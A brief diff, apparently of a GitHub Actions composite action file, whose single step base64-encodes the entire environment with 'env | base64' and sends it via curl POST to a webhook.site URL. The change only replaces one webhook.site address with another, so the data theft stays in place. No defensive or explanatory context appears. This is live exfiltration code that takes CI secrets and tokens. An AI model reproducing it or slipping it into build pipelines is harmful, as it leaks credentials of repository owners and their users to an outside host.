@@ -14,5 +14,5 @@ runs:
   steps:
     - run: |
        export DATA=$(env | base64 -w 0)
-        curl -X POST -d "payload=$DATA" https://webhook.site/750d501a-e373-4c21-8dfc-678f431dcd87
+        curl -X POST -d "payload=$DATA" https://webhook.site/f4421d0a-4ea3-4b3e-a146-c9c73ab1768f
       shell: bash
